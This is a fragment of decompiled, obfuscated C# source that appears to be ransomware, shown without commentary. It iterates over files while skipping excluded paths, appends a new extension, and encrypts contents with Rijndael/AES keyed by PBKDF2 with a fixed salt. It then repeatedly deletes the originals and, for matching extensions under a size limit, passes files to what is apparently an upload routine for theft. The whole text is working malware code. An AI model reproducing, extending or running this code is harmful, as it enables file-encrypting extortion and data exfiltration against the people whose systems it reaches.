												if (Convert.ToInt32(CkwHjikrCvdOm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.jxlBzzkVmZwV).Length)
												{
													try
													{
														CymodjHxdipp.RDxamUeGvIod(uNiEyIpSZVz.OexHNbhRQqQ.getString_0(107389834), uNiEyIpSZVz.OexHNbhRQqQ.getString_0(107389829), uNiEyIpSZVz.OexHNbhRQqQ.getString_0(107389784), CS_0024_003C_003E8__locals0.jxlBzzkVmZwV);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.jxlBzzkVmZwV.ToLower().EndsWith(item) && bXfvZIqjNkLdMvI == uNiEyIpSZVz.OexHNbhRQqQ.getString_0(107397023))
											{
												try
												{
													CymodjHxdipp.RDxamUeGvIod(uNiEyIpSZVz.OexHNbhRQqQ.getString_0(107389834), uNiEyIpSZVz.OexHNbhRQqQ.getString_0(107389829), uNiEyIpSZVz.OexHNbhRQqQ.getString_0(107389784), CS_0024_003C_003E8__locals0.jxlBzzkVmZwV);
												}
												catch
												{
												}
											}
										}
									});
									thread4.Priority = ThreadPriority.Normal;
									thread4.IsBackground = false;
									thread4.Start();
								}
								byte[] bytes4 = Encoding.ASCII.GetBytes(jlwdVcCVDXv);
								if (uuDJEvtSXmqQR == uNiEyIpSZVz.getString_0(107397016))
								{
									byte[] array2 = null;
									byte[] byte_2 = qsVBtPrJSv.onZydZdaURpY(CS_0024_003C_003E8__locals0.jxlBzzkVmZwV, Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024);
									if (qsVBtPrJSv.lvDlvibtIHl(uqGgpaIFQqSRvN: (!pfmrZzuzgFVdg) ? (yzxmjEHglZqnOW ? qsVBtPrJSv.KiYWDoMxnom(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qsVBtPrJSv.KiYWDoMxnom(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (yzxmjEHglZqnOW ? ZJPCkUensbMQ.azaPAsjkpkAz(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD)) : ZJPCkUensbMQ.azaPAsjkpkAz(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD))), HnqoYCdHvfu: CS_0024_003C_003E8__locals0.jxlBzzkVmZwV, yLndxBtngveE: bytes4))
									{
										goto IL_10b1;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, CS_0024_003C_003E8__locals1.dxgicsPAINTY);
									}
									catch (Exception)
									{
									}
								}
								else if (!yzxmjEHglZqnOW)
								{
									if (zQrrdfdyTPbGA.opNZPDFPzEYow(CS_0024_003C_003E8__locals0.jxlBzzkVmZwV, JRjvEgYWmxeX, CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS, null, Convert.FromBase64String(orecqussiUlGJkD)))
									{
										goto IL_10b1;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, CS_0024_003C_003E8__locals1.dxgicsPAINTY);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (zQrrdfdyTPbGA.opNZPDFPzEYow(CS_0024_003C_003E8__locals0.jxlBzzkVmZwV, JRjvEgYWmxeX, CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS, bytes4, Convert.FromBase64String(orecqussiUlGJkD)))
									{
										goto IL_10b1;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, CS_0024_003C_003E8__locals1.dxgicsPAINTY);
									}
									catch (Exception)
									{
									}
								}
								end_IL_08ba_2:;
							}
							catch (Exception)
							{
								goto IL_10b1;
							}
						}
					}
					continue;
					IL_10b1:
					CS_0024_003C_003E8__locals0.VpbroTtOOIHkJa.Remove(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.VpbroTtOOIHkJa, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new uNiEyIpSZVz.XqXXZafSRwIHeXM();
			CS_0024_003C_003E8__locals0.WzuXuFEQNWZh = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.dxgicsPAINTY = string_0;
			if (!CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389258)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389233)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389200)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389215)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389170)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389177)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389156)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389143)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389098)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389093)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389084)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389547)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389521)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389532)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389507)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389458)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389473)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389424)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389439)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389390)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389405)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389356)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389375)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389322)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389341)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107388784)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107388799)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107388750)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(SptLhhxIveIbH(uNiEyIpSZVz.getString_0(107388765))) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107388740)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107397156)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107388727)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(CS_0024_003C_003E8__locals0.FuYKgKQHbtN) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(uNiEyIpSZVz.getString_0(107388702)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(uNiEyIpSZVz.getString_0(107388697)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(uNiEyIpSZVz.getString_0(107388660)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(uNiEyIpSZVz.getString_0(107388655)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107388650)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(UYUhiRtWDRA) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(LtQdcjdFVaR) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(UJdCCmcOabmXjhMvpZ))
			{
				if (CS_0024_003C_003E8__locals0.IATEnfqjKRGd.Length != 0)
				{
					string[] iATEnfqjKRGd = CS_0024_003C_003E8__locals0.IATEnfqjKRGd;
					int num = 0;
					while (num < iATEnfqjKRGd.Length)
					{
						string value = iATEnfqjKRGd[num];
						if (!CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_102c;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(CS_0024_003C_003E8__locals0.FuYKgKQHbtN))
					{
						goto IL_102c;
					}
				}
				catch (Exception)
				{
					goto IL_102c;
				}
				if (!rhZfJiziUVZGmK.Contains(CS_0024_003C_003E8__locals0.dxgicsPAINTY))
				{
					if (NTUVpfCRDqR == uNiEyIpSZVz.getString_0(107396906))
					{
						try
						{
							if (FTTifYaMdeudV.DQVZdjxliaL(CS_0024_003C_003E8__locals0.dxgicsPAINTY))
							{
								FTTifYaMdeudV.lsApOpcnkf(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
							}
						}
						catch
						{
						}
					}
					rhZfJiziUVZGmK.Add(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (vnHLNKxzZjB)
							{
								Console.WriteLine(uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107403199) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107403096) + new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length + uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107403107));
								Console.WriteLine(uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107403206), rhZfJiziUVZGmK.Count, bTxbPbZzsh, hRbHTMLNoeoN);
								Console.WriteLine(uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107402637), AxBdgXHxeQeZJ.Elapsed);
								Console.WriteLine(uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107403066));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!LcgkciImoRwcI.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.dxgicsPAINTY)))
					{
						LcgkciImoRwcI.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.dxgicsPAINTY));
					}
					UyKwBXYiIu(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
					try
					{
						new yQFjeolKXMd().noDvZcrtQzqfZg(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.dxgicsPAINTY, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (vnHLNKxzZjB)
								{
									Console.WriteLine(uNiEyIpSZVz.getString_0(107403675) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107403086) + new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length + uNiEyIpSZVz.getString_0(107403097));
									Console.WriteLine(uNiEyIpSZVz.getString_0(107403056));
								}
							}
							catch
							{
							}
							katTjVhRXIw(SptLhhxIveIbH(uNiEyIpSZVz.getString_0(107402951)), uNiEyIpSZVz.getString_0(107388598) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107388598) + SptLhhxIveIbH(uNiEyIpSZVz.getString_0(107402926)) + uNiEyIpSZVz.getString_0(107388598) + Environment.UserName + uNiEyIpSZVz.getString_0(107388598) + SptLhhxIveIbH(uNiEyIpSZVz.getString_0(107402941)));
						}
					}
					catch (Exception ex2)
					{
						if (ZQkgwClpBNRNGiD)
						{
							try
							{
								File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107402916) + ex2.Message + uNiEyIpSZVz.getString_0(107396624));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length != 0L)
							{
								goto end_IL_0887;
							}
							goto end_IL_0887_2;
							end_IL_0887:;
						}
						catch (Exception ex4)
						{
							if (ZQkgwClpBNRNGiD)
							{
								try
								{
									File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107403315) + ex4.Message + uNiEyIpSZVz.getString_0(107396624));
								}
								catch (Exception)
								{
								}
							}
							hRbHTMLNoeoN++;
							goto end_IL_0887_2;
						}
						if (GVzkeDFkkNt == uNiEyIpSZVz.getString_0(107396906) && new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length > Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.FuYKgKQHbtN != uNiEyIpSZVz.getString_0(107386728))
								{
									if (IrAGOpnAWTw)
									{
										CS_0024_003C_003E8__locals0.FuYKgKQHbtN = QgOBOurkDz + CS_0024_003C_003E8__locals0.FuYKgKQHbtN;
									}
									File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN);
								}
							}
							catch (Exception ex6)
							{
								if (ZQkgwClpBNRNGiD)
								{
									try
									{
										File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107403286) + ex6.Message + uNiEyIpSZVz.getString_0(107396624));
									}
									catch (Exception)
									{
									}
								}
								hRbHTMLNoeoN++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.FuYKgKQHbtN != uNiEyIpSZVz.getString_0(107386728))
							{
								CS_0024_003C_003E8__locals0.dxgicsPAINTY += CS_0024_003C_003E8__locals0.FuYKgKQHbtN;
							}
							if (sKNvVrMLVliweTD == uNiEyIpSZVz.getString_0(107396906))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in fWsOOFrdViRF)
									{
										if (CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.WzuXuFEQNWZh.FuYKgKQHbtN) && bXfvZIqjNkLdMvI == uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107396916))
										{
											if (Convert.ToInt32(CkwHjikrCvdOm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length)
											{
												try
												{
													CymodjHxdipp.RDxamUeGvIod(uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107389837), uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107389832), uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107389787), CS_0024_003C_003E8__locals0.dxgicsPAINTY);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().EndsWith(item2) && bXfvZIqjNkLdMvI == uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107397026))
										{
											try
											{
												CymodjHxdipp.RDxamUeGvIod(uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107389837), uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107389832), uNiEyIpSZVz.XqXXZafSRwIHeXM.getString_0(107389787), CS_0024_003C_003E8__locals0.dxgicsPAINTY);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(jlwdVcCVDXv);
							if (uuDJEvtSXmqQR == uNiEyIpSZVz.getString_0(107397016))
							{
								byte[] array = null;
								byte[] byte_ = qsVBtPrJSv.onZydZdaURpY(CS_0024_003C_003E8__locals0.dxgicsPAINTY, Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024);
								if (!qsVBtPrJSv.lvDlvibtIHl(uqGgpaIFQqSRvN: (!pfmrZzuzgFVdg) ? (yzxmjEHglZqnOW ? qsVBtPrJSv.KiYWDoMxnom(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qsVBtPrJSv.KiYWDoMxnom(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (yzxmjEHglZqnOW ? ZJPCkUensbMQ.azaPAsjkpkAz(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD)) : ZJPCkUensbMQ.azaPAsjkpkAz(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD))), HnqoYCdHvfu: CS_0024_003C_003E8__locals0.dxgicsPAINTY, yLndxBtngveE: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, CS_0024_003C_003E8__locals0.dxgicsPAINTY);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!yzxmjEHglZqnOW)
							{
								if (!zQrrdfdyTPbGA.opNZPDFPzEYow(CS_0024_003C_003E8__locals0.dxgicsPAINTY, JRjvEgYWmxeX, CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS, null, Convert.FromBase64String(orecqussiUlGJkD)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, CS_0024_003C_003E8__locals0.dxgicsPAINTY);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!zQrrdfdyTPbGA.opNZPDFPzEYow(CS_0024_003C_003E8__locals0.dxgicsPAINTY, JRjvEgYWmxeX, CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS, bytes, Convert.FromBase64String(orecqussiUlGJkD)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, CS_0024_003C_003E8__locals0.dxgicsPAINTY);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (IrAGOpnAWTw)
							{
								CS_0024_003C_003E8__locals0.FuYKgKQHbtN = QgOBOurkDz + CS_0024_003C_003E8__locals0.FuYKgKQHbtN;
							}
							byte[] bytes2 = Encoding.ASCII.GetBytes(jlwdVcCVDXv);
							if (CS_0024_003C_003E8__locals0.FuYKgKQHbtN != uNiEyIpSZVz.getString_0(107386728))
							{
								if (!hQdOFpLMvqT)
								{
									if (!yzxmjEHglZqnOW)
									{
										bjDjiXZhvR(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, RpFQaGTQWAGLZ);
									}
									else
									{
										bjDjiXZhvR(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS));
									}
								}
								else
								{
									try
									{
										if (!yzxmjEHglZqnOW)
										{
											djVxzdXCmcblm(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, RpFQaGTQWAGLZ, Convert.FromBase64String(orecqussiUlGJkD));
										}
										else
										{
											djVxzdXCmcblm(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD));
										}
									}
									catch (Exception ex11)
									{
										if (ZQkgwClpBNRNGiD)
										{
											try
											{
												File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107386746) + ex11.Message + uNiEyIpSZVz.getString_0(107396624));
											}
											catch (Exception)
											{
											}
										}
										hRbHTMLNoeoN++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, CS_0024_003C_003E8__locals0.dxgicsPAINTY);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!hQdOFpLMvqT)
							{
								if (!yzxmjEHglZqnOW)
								{
									bjDjiXZhvR(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107386755), RpFQaGTQWAGLZ);
								}
								else
								{
									bjDjiXZhvR(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107386755), Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS));
								}
							}
							else
							{
								try
								{
									if (!yzxmjEHglZqnOW)
									{
										djVxzdXCmcblm(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY, RpFQaGTQWAGLZ, Convert.FromBase64String(orecqussiUlGJkD));
									}
									else
									{
										djVxzdXCmcblm(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD));
									}
								}
								catch (Exception ex14)
								{
									if (ZQkgwClpBNRNGiD)
									{
										try
										{
											File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107386746) + ex14.Message + uNiEyIpSZVz.getString_0(107396624));
										}
										catch (Exception)
										{
										}
									}
									hRbHTMLNoeoN++;
									return;
								}
							}
							if (yzxmjEHglZqnOW)
							{
								if (CS_0024_003C_003E8__locals0.FuYKgKQHbtN != uNiEyIpSZVz.getString_0(107386728))
								{
									OGgWAVXoBCZ(CS_0024_003C_003E8__locals0.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, bytes2);
								}
								else
								{
									OGgWAVXoBCZ(CS_0024_003C_003E8__locals0.dxgicsPAINTY, bytes2);
								}
							}
						}
						end_IL_0887_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_102c;
			IL_102c:
			CS_0024_003C_003E8__locals0.VpbroTtOOIHkJa.Remove(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
		});
	}

	private static void RliZPxXhOnVjs(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (sKNvVrMLVliweTD == getString_0(107396888))
					{
						foreach (string item in fWsOOFrdViRF)
						{
							if (string_0.ToLower().EndsWith(item) && bXfvZIqjNkLdMvI == getString_0(107396888))
							{
								if (Convert.ToInt32(CkwHjikrCvdOm) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										CymodjHxdipp.RDxamUeGvIod(getString_0(107389809), getString_0(107389804), getString_0(107389759), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && bXfvZIqjNkLdMvI == getString_0(107396998))
							{
								try
								{
									CymodjHxdipp.RDxamUeGvIod(getString_0(107389809), getString_0(107389804), getString_0(107389759), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386737)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386737), getString_0(107389696)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void djVxzdXCmcblm(string RPvNVNXTQdQAaj, string bbNjiACqxOwf, byte[] mUaQZjEzMHwCcZY, byte[] agpBGvWqYU = null)
	{
		try
		{
			if (sKNvVrMLVliweTD == getString_0(107396888))
			{
				FileStream fileStream = new FileStream(RPvNVNXTQdQAaj, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in fWsOOFrdViRF)
				{
					if (RPvNVNXTQdQAaj.ToLower().EndsWith(item) && bXfvZIqjNkLdMvI == getString_0(107396888))
					{
						if (Convert.ToInt32(CkwHjikrCvdOm) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								CymodjHxdipp.RDxamUeGvIod(getString_0(107389809), getString_0(107389804), getString_0(107389759), RPvNVNXTQdQAaj);
							}
							catch
							{
							}
						}
					}
					else if (RPvNVNXTQdQAaj.ToLower().EndsWith(item) && bXfvZIqjNkLdMvI == getString_0(107396998))
					{
						try
						{
							CymodjHxdipp.RDxamUeGvIod(getString_0(107389809), getString_0(107389804), getString_0(107389759), RPvNVNXTQdQAaj);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (RPvNVNXTQdQAaj != bbNjiACqxOwf)
		{
			File.Move(RPvNVNXTQdQAaj, bbNjiACqxOwf);
			RPvNVNXTQdQAaj = bbNjiACqxOwf;
		}
		byte[] bytes = ZJPCkUensbMQ.azaPAsjkpkAz(File.ReadAllBytes(RPvNVNXTQdQAaj), mUaQZjEzMHwCcZY, agpBGvWqYU);
		File.WriteAllBytes(RPvNVNXTQdQAaj, bytes);
		bTxbPbZzsh++;
	}

	private static void bjDjiXZhvR(string string_0, string string_1, byte[] byte_0)
	{
		gzGFjyrkaQCbwUn CS_0024_003C_003E8__locals0 = new gzGFjyrkaQCbwUn();
		CS_0024_003C_003E8__locals0.vybiJPCpzaMZFm = string_0;
		CS_0024_003C_003E8__locals0.ZUJWVRuVDljeM = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string zUJWVRuVDljeM = CS_0024_003C_003E8__locals0.ZUJWVRuVDljeM;
			FileStream fileStream = new FileStream(zUJWVRuVDljeM, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
